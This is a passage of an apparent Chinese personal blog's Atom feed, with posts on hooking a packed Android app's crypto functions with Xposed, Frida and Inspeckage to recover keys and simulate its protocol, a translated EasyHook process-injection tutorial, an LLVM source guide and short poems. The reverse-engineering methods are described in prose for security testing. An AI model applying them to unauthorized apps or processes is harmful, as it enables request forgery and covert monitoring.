alt="w500"><br>这里就能看到缓存文件夹的创建和使用，即涉事文件夹“uil-image”。</p><p>以上是事件涉及的函数。总结一下流程：<br>应用全局监听媒体内容变化（截图事件），出现截图后，根据uri信息获取图片信息，拿到图片路径后，生成特征字符串再本地缓存图片，供其他功能调用，这里只看到图片预览功能，未发现任何网络相关操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纯黑盒（不脱壳）app测试</title>
    <link href="https://f4ncy.top/2019/02/25/blackhook/"/>
    <id>https://f4ncy.top/2019/02/25/blackhook/</id>
    <published>2019-02-25T06:04:40.000Z</published>
    <updated>2019-02-25T06:07:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="纯黑盒（不脱壳）app测试"><a href="#纯黑盒（不脱壳）app测试" class="headerlink" title="纯黑盒（不脱壳）app测试"></a>纯黑盒（不脱壳）app测试</h1><p>之前做一个项目，需要分析出协议是否可以被攻击者模拟利用，app使用了加固，协议进行了加密，在完全黑盒的情况下进行测试。</p><p>一般情况下我们分析协议，直接反编译apk，找请求发包代码，一层层往上找，或者利用url关键字搜索，很容易发现参数处理的代码，还原逻辑，比较简单的甚至可以直接复制代码就能模拟协议了。<br>但是在黑盒的情况下，想拿到代码不太现实。收费版加固的强度还是足够的，脱壳需要的精力太大，不脱壳又看不到实现代码，无法还原逻辑。所以这里就讲一下纯黑盒下的协议分析。</p><p>这里涉及的技术其实就是动态分析技术，不是动态调试哦，一般的壳都会带反调试功能的。<br>动态分析工具在不侵入应用代码的情况下，获取应用执行的函数和调用顺序。通过筛选函数信息，完成对应用实现逻辑的大体还原。</p><h2 id="Traceview-Xposed"><a href="#Traceview-Xposed" class="headerlink" title="Traceview+Xposed"></a>Traceview+Xposed</h2><p>traceview是ddms里的一个功能，android studio也集成了（AS里的Record有时会报失败的错误）。<br><img src="/2019/02/25/blackhook/15508004241993.jpg"><br><img src="/2019/02/25/blackhook/15508048574747.jpg"></p><p>结束时得到一个.trace文件，里面记录了大量的函数调用，这时候需要你的一点经验了，筛选过滤出目标函数，通过该函数的调用上下文来梳理逻辑。<br>项目里的应用会根据订单信息产生一个二维码，尝试搜索“QR”：<br><img src="/2019/02/25/blackhook/15508051556815.jpg" alt="a-w600"><br>运气不错，存在调用createQRImage函数，该函数会由字符串参数指定生成二维码。利用Xposed hook得到一个加密的字符串，猜测是订单信息加密之后得到的。<br>这里说一下，hook方法和工具很多，用frida简单快速，不过对于加固应用，具有反调试，不能直接hook（直接hook是frida的进程ptrace到目标进程，会被kill），frida提供-f选项来让frida产生一个目标进程（这里对某叠词加固的双进程保护有效）。</p><p>想办法得到加密相关信息，一般写加密会用到的两个包，javax.crypto.~和(com.android.)org.bouncycastle那个包，那么搜索相关关键字就行。</p><p><img src="/2019/02/25/blackhook/15508255565094.jpg" alt="b-w600"><br><img src="/2019/02/25/blackhook/15508255648698.jpg" alt="c-w600"></p><p>实际中需要观察涉及到的函数名，有些是自写函数，会直接返回明文、IV、密钥等信息，这些函数hook起来很方便，也不用筛选log，因为自写函数基本都是在业务中的调用。</p><p>从客户那里了解到，请求的包体加密前还要做一下签名，一般做参数签名用到的md5、sha1、sha256这些，也很好hook：<br><img src="/2019/02/25/blackhook/15508259002282.jpg" alt="d-w600"></p><p>ok，拿到对协议参数做处理的函数后，就需要hook来验证，xposed写hook没什么特别的操作（找一个支持加固应用的demo就行，也就是支持multidex）。</p><p><img src="/2019/02/25/blackhook/15508261077649.jpg" alt="e-w600"></p><p><img src="/2019/02/25/blackhook/15508261396429.jpg" alt="f-w300"></p><p>一般知道加密函数、加密模式、密钥、IV后就能模拟应用发包请求了，大部分的应用协议加密类就一个，密钥什么的也都通用，甚至有些本地文件加密也和协议用的是同一个加密类。</p><p>这里推荐一篇<a href="https://la0s.github.io/2018/06/28/Toos2/">博客</a>，介绍了我用到的工具，也让我知道了还有下面要讲的自动化的工具。</p><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p><a href="https://repo.xposed.info/module/mobi.acpm.inspeckage">下载地址</a></p><p>安装之后，选择要分析的应用，点击“Launch APP”即可：</p><p><img src="/2019/02/25/blackhook/15508266726004.jpg" alt="g-w400"></p><p>本地转发8008端口，就可以打开提供的web视图：</p><p>加密类记录：<br><img src="/2019/02/25/blackhook/15508267996596.jpg" alt="h-w600"></p><p>哈希类记录：<br><img src="/2019/02/25/blackhook/15508269689635.jpg" alt="i-w600"></p><p>自动化的动态分析工具还是很方便的，由于它记录的函数是库中的函数，如果应用中涉及的加密自写了函数，就需要手动hook了，所以两种方法结合着用吧。<br>这里遇到的问题是端口老是掉，需要重新开启端口。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LLVM源代码指南</title>
    <link href="https://f4ncy.top/2018/12/04/llvmguide-1/"/>
    <id>https://f4ncy.top/2018/12/04/llvmguide-1/</id>
    <published>2018-12-04T01:36:39.000Z</published>
    <updated>2018-12-04T10:00:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="LLVM源代码指南"><a href="#LLVM源代码指南" class="headerlink" title="LLVM源代码指南"></a>LLVM源代码指南</h1><ul><li>LLVM内核不包括前端，只是“中端”优化器，一堆后端，文档，还有大量辅助代码。像Clang这样的前端被放在单独的项目中。</li><li>核心的LLVM表现在RAM中，并使用大量C++ API进行操作。这种表现方式是可以转储到可读文本并解析回内存，但这只是为了方便调试：在使用LLVM的正常编译期间，永远不会生成文本形式的IR。通常，前端通过调用LLVM API来构建IR，然后运行一些优化PASS，最后调用后端来生成汇编或机器代码。当LLVM代码被存储在磁盘上时（在使用Clang正常编译C/C++时甚至都不会存在这种情况），是以“bitcode”形式存放，是一种紧凑的二进程表示。</li><li>主要的LLVM API文档由doxygen生成，可以在<a href="http://llvm.org/doxygen/index.html">这里</a>找到。除非您已经知道自己在做什么以及在寻找什么（带有目的性的找和看），否侧这些信息很难被利用。以下链接是开始学习LLVM API的教程。</li></ul><p>代码<a href="https://github.com/llvm-mirror/llvm/tree/release_39">根目录</a>，包含以下：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/bindings">bindings</a>允许从C++以外的编程语言使用LLVM API。存在比这更多的bindings，包括C（我们将稍后介绍）和Haskell（<a href="https://hackage.haskell.org/package/llvm-general">目录之外</a>）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/cmake">cmake</a>:LLVM现在使用CMake而不是autoconf。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs">docs</a>ReStructuredText格式。请参阅<a href="https://github.com/llvm-mirror/llvm/blob/release_39/docs/LangRef.rst">语言参考手册</a>，它定义了每个LLVM指令的含义。<a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs/tutorial">tutorial</a>子目录中的素材特别有趣，但不要在那里看，而是去<a href="http://llvm.org/docs/tutorial/">这里</a>。这是学习LLVM最好的方式。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/examples">examples</a>:这是教程配套的源代码。作为LLVM hacker，应该尽可能地从这里抠代码、CMakeLists.txt等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/include">include</a>:第一个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm-c">llvm-c</a>包含了C的binding（作者曰：我从没使用过，但是看起来十分可靠）。重要的是，LLVM试图保持这些binding不变，而C++ API在不同版本中发生较大变化，尽管过去几年中变化的步伐已经放缓。第二个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm">llvm</a>是个大头：它包含878个头文件，用于定义所有LLVM API。一般来说，使用这些文件的doxygen版本而不是直接读取他们会更容易，但我经常最后使用这些文件来查找某些功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib">lib</a>包含了真正的好东西，我们之后会单独看一下。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/projects">projects</a>默认是不包含任何内容，但是可以在其中查看LLVM组件，例如compiler-rt（清理程序之类的运行时库），OpenMP support，以及位于单独repo中的LLVM C++库。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/resources">resources</a>一些Visual C++的东西，并不关心（用于Windows二进制文件的版本资源定义）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/runtimes">runtimes</a>:外部项目的另一个占位符，在不久前加入。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/test">test</a>:它也是一个大头，它包含了数以千计的LLVM单元测试，它们在构建检查目标时运行。其中大多数是包含LLVM IR文本版本的.ll文件。会测试比如说，一个优化pass是否能得到预期结果。我将在即将发布的博客中详细介绍LLVM的测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/tools">tools</a>:LLVM本身只是一个库的集合，没有任何特定的主要功能。tools目录的大多数子目录都包含一个链接LLVM库的可执行工具。例如，llvm-dis是从bitcode到文本汇编格式的反汇编程序。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/unittests">unittests</a>:更多单元测试，也是在检查构建目标时运行。这些是使用Google Test框架直接调用API的C++文件，而不像“test”目录里的部分，通过运行汇编程序，反汇编程序或优化程序等内容来间接调用LLVM功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/utils">utils</a>:用于LLVM编码约定的emacs和vim模式；一个Valgrind suppression文件，以Valgrind监视所有子进程的方式在运行make check时消除误报；支持单元测试的lit和FileCheck工具；还有很多其他随机的东西。</li></ol><p>以下是跳过的“lib”目录，它包含了所有的重要内容，现在看一下它的子目录：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Analysis">Analysis</a>包含许多静态Analysis，可以在编译器教科书中阅读这些Analysis，例如别名分析和全局值编号。某些Analysis是基于LLVM pass，必须由pass manager运行。其他的是基于library，能够直接调用。Analysis中一个奇怪的成员是InstructionSimplify.cpp，这是一个转换器，而不是分析器；我相信有人可以发表评论来解释它在这里做了什么（见<a href="#comment-19005">评论</a>）。我将在后续帖子中深入研究这个目录。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/AsmParser">AsmParser</a>:将文本IR解析道内存中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Bitcode">Bitcode</a>:将IR序列化为紧凑格式并将其读回RAM。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/CodeGen">CodeGen</a>:LLVM目标无关的代码生成器，基本上是LLVM后端适配的一个框架，也是后端可以使用的一堆库函数。这里有太多太多东西了（&gt;100 KLOC）不幸作者也不完全了解。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/DebugInfo">DebugInfo</a>是一个用户维护LLVM指令和源代码位置之间映射的库。在2014年LLVM开发者大会的演讲中，这些<a href="http://llvm.org/devmtg/2014-10/Slides/Christopher-DebugInfoTutorial.pdf">slides</a>中有很多有用的信息。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ExecutionEngine">ExecutionEngine</a>:虽然LLVM通常被转换为汇编代码或机器码，但它可以使用解释器直接执行。作者最后一次使用它时，non-jitting解释器并不是十分有效，但是无论如何它比运行jitted代码慢地多。最新的<a href="http://llvm.org/devmtg/2016-11/#talk1">JIT API</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Fuzzer">Fuzzer</a>:这是一个类似于<a href="http://lcamtuf.coredump.cx/afl/">AFL</a>的coverage-guided fuzzer。它不是fuzz LLVM组件，而是作为LLVM功能对由LLVM编译得到的程序进行模糊测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IR">IR</a>:一些与IR相关代码，没有其他明显的统一主题。有用于将IR转换为文本格式的代码，有用于升级由早期版本的LLVM创建的bitcode文件，有用于在创建IR节点时折叠常量等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IRReader">IRReader</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LibDriver">LibDriver</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LineEditor">LineEditor</a>:nobody care about these.</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Linker">Linker</a>:一个LLVM模块（就像C/C++的编译单元），包含函数和变量。LLVM Linker将多个模块组合到一个更大的模块中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LTO">LTO</a>:链接时优化（许多博客文章和博士论文的主题）允许汇编优化联系独立编译所创建的边界。LLVM可以无花销地进行链接时优化，链接器创建一个大模块，然后使用常规优化PASS来优化。这曾经是首选的方法，但它不能扩展到大型项目。目前采用的方法是<a href="http://blog.llvm.org/2016/06/thinlto-scalable-and-incremental-lto.html">ThinLTO</a>，它以很小的代价获得很大的效益。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/MC">MC</a>:编译器通常发出汇编代码，让汇编程序处理创建机器代码。LLVM中的<a href="http://blog.llvm.org/2010/04/intro-to-llvm-mc-project.html">MC子系统</a>切断了中间过程并直接生成机器代码。这可以加快编译速度，在LLVM用作JIT编译器时尤其有用。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Object">Object</a>:处理目标文件格式的详细信息，例如ELF。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ObjectYAML">ObjectYAML</a>:ObjectYAML似乎支持将对象文件编码为<a href="http://llvm.org/docs/YamlIO.html">YAML</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Option">Option</a>:命令行解析。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Passes">Passes</a>:PASS管理器的一部分，它调度和排序LLVM PASS，将其依赖关系和无效性考虑在内。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ProfileData">ProfileData</a>:读取和写入配置文件数据以支持配置文件引导的优化。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Support">Support</a>:其他支持代码包括APInts（在LLVM中普遍使用的任意精度整数）等等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/TableGen">TableGen</a>:一种<a href="http://llvm.org/docs/TableGen/">工具</a>（作者称其为古怪的瑞士军刀），它输入.td文件（其中LLVM中有200多个）包含结构化数据，并使用特定于域的后端发出由LLVM编译的C++代码。例如，TableGen被用来提取一些实现汇编器和反汇编器中单调的东西。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Target">Target</a>:这里有后端中指定特定处理器的部分。有很多TableGen文件。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Transforms">Transforms</a>:这是我最喜欢的目录，它是中端优化器所在的地方。IPO包含跨越函数边界的过程间优化，它们通常不会过于激进，因为它们必须查看大量代码。InstCombine是LLVM的窥视优化器的野兽。Instrumentation支持sanitizers。ObjCARC支持这一点。Scalar包含一堆教科书式的编译器各种优化器，我会尝试在某个时候写一篇关于这个目录内容的更详细的帖子。Utils是帮助代码。Vectorize是LLVM的自动矢量化器，近年来已成为许多工作的主题。</li></ol><p><span id="comment-19005">它不会改变IR本身。llvm::SumplifyInstruction的规则是它只能返回程序中的常量或现有值，这符合Analysis的要求。在每条指令上调用SimplifyInstruction的PASS是lib/Transforms/Utils/SimplifyInstructions.cpp里的转换器PASS。</span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FileMonitorHook例子(translate)</title>
    <link href="https://f4ncy.top/2018/09/01/EasyHook/"/>
    <id>https://f4ncy.top/2018/09/01/EasyHook/</id>
    <published>2018-09-01T08:35:29.000Z</published>
    <updated>2018-09-04T06:15:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="EasyHook-FileMonitorHook"><a href="#EasyHook-FileMonitorHook" class="headerlink" title="EasyHook-FileMonitorHook"></a>EasyHook-FileMonitorHook</h1><h3 id="创建远程文件监视器"><a href="#创建远程文件监视器" class="headerlink" title="创建远程文件监视器"></a>创建远程文件监视器</h3><p>在本教程中，我们将使用EasyHook创建一个远程文件监视器。<br>我们将介绍如何：<br>根据进程ID将托管程序集注入现有目标进程,使用可执行文件路径将托管程序集注入新创建（并暂停）的进程<br>在远程进程中创建本地挂钩以监视3个文件操作（CreateFile，ReadFile和WriteFile）,使用.NET进程间通信（IPC）将报告文件访问回主控制台应用程序.</p><p>在本教程中，我们将创建一个包含两个项目的解决方案：<br>FileMonitor：一个C＃控制台应用程序;<br>FileMonitorHook：包含钩子逻辑和IPC接口的C＃类库。该组件是我们的注入payload。</p><h3 id="Remote-hooking-概述"><a href="#Remote-hooking-概述" class="headerlink" title="Remote hooking 概述"></a>Remote hooking 概述</h3><p>远程hook通常先用“injector”向目标进程注入一个payload，利用这个payload再安装我们的钩子。<br>由此，EasyHook库提供了“EasyHook.RemoteHooking”静态类和“EasyHook.IEntryPoint”接口。</p><ol><li>EasyHook.RemoteHooking.Inject:<br> 向指定的进程注入特定的32位/64位payload指令集，提供的参数将被传递给被注入的库。</li><li>EasyHook.RemoteHooking.CreateAndInject:<br> 从提供的可执行路径和命令行以挂起状态创建一个新进程，然后以“Inject”方式注入一个特定的32位/64位payload。</li><li>EasyHook.RemoteHooking.WakeUpProcess:<br> 与payload/注入库中的CreateAndInject结合使用，以在准备就绪时唤醒进程。</li><li>EasyHook.RemoteHooking.IpcCreateServer<T>:<br> 一个用来初始化injector和host的IPC通道的辅助方法。</T></li><li>EasyHook.RemoteHooking.IpcConnectClient<T>:<br> 一个用来在注入完成后将客户端连接至IPC通道的辅助方法。（被运行在目标进程中的注入的dll所调用）</T></li><li>EasyHook.IEntryPoint:<br> payload指令集必须包含一个public类来实现此接口。</li></ol><p>待完成注入后payload将使用EasyHook.LocalHook来创建钩子。</p><h3 id="EasyHook-RemoteHooking-Inject"><a href="#EasyHook-RemoteHooking-Inject" class="headerlink" title="EasyHook.RemoteHooking.Inject"></a>EasyHook.RemoteHooking.Inject</h3><ul><li>1.&emsp;EasyHook.RemoteHooking.Inject 序列化配置，包括payload集合的路径和参数。</li><li>2.&emsp;向指定的目标进程中注入原生EasyHook32.dll或EasyHook64.dll依赖于它本身是32位或64位。如果有必要的话，EasyHook将自动使用EasyHookSvc32/64.exe来帮助程序将32位注入到64位中或反过来。  EasyHook.RemoteHooking.Inject 将会等待，直到它超时或者它已经发出注入已完成/失败的信号。</li></ul><p>– 此时已运行在目标进程中 –</p><ul><li><p>3.&emsp;EasyHook32/64.dll通过加载EasyLoad32/64.dll来完成“managed injection”<br>（EasyLoad尝试创建一个新的AppDomain，以便可以卸载注入库）<br>（EasyHook32/64.dll发出EasyHook.RemoteHooking.Inject注入完成的信号）</p></li><li><p>4.&emsp;EasyLoad将托管程序集EasyHook.dll加载到目标进程并调用EasyHook.InjectionLoader.Main方法。</p></li><li><p>5.&emsp;EasyHook.InjectionLoader反序列化配置，加载有效负载程序集并查找与提供给EasyHook.RemoteHooking.Inject调用的参数相匹配的EasyHook.IEntryPoint。</p></li><li><p>6.&emsp;如果找到，就会实例化payload集合中相匹配的EasyHook.IEntryPoint并最终调用对应的Run方法。</p></li><li><p>7.&emsp;Payload的Run方法安装若干钩子。</p></li></ul><p>&emsp;&emsp;&emsp;&emsp;最后当Run方法退出后，EasyLoad将会尝试卸载AppDomain</p><h3 id="EasyHook-RemoteHooking-CreateAndInject"><a href="#EasyHook-RemoteHooking-CreateAndInject" class="headerlink" title="EasyHook.RemoteHooking.CreateAndInject"></a>EasyHook.RemoteHooking.CreateAndInject</h3><ol><li>从提供的可执行路径和命令行以挂起状态创建一个新进程。</li><li>按照EasyHook.RemoteHooking.Inject的运行逻辑。</li><li>被创建的进程会保持被挂起的状态直到payload调用RemoteHooking.WakeUpProcess。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>望</title>
    <link href="https://f4ncy.top/2018/08/03/play20180803/"/>
    <id>https://f4ncy.top/2018/08/03/play20180803/</id>
    <published>2018-08-03T06:16:31.000Z</published>
    <updated>2018-08-07T06:45:43.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>四周张望，空旷得慌张；看着远方，残云里惘惘。你的出现，拉近了我的焦点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>远</title>
    <link href="https://f4ncy.top/2018/08/01/play201808012/"/>
    <id>https://f4ncy.top/2018/08/01/play201808012/</id>
    <published>2018-08-01T04:24:22.000Z</published>
    <updated>2018-08-02T04:18:50.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>遇了越来越多的人，说着越来越少的话，在越来越小的屋子里，等着越来越远的云。<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;梦见越来越模糊的你。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>意</title>
    <link href="https://f4ncy.top/2018/08/01/play20180801/"/>
    <id>https://f4ncy.top/2018/08/01/play20180801/</id>
    <published>2018-08-01T01:37:08.000Z</published>
    <updated>2018-08-01T04:38:14.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>蝉，吵得身临其境。雪，下得记忆犹新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
</feed>
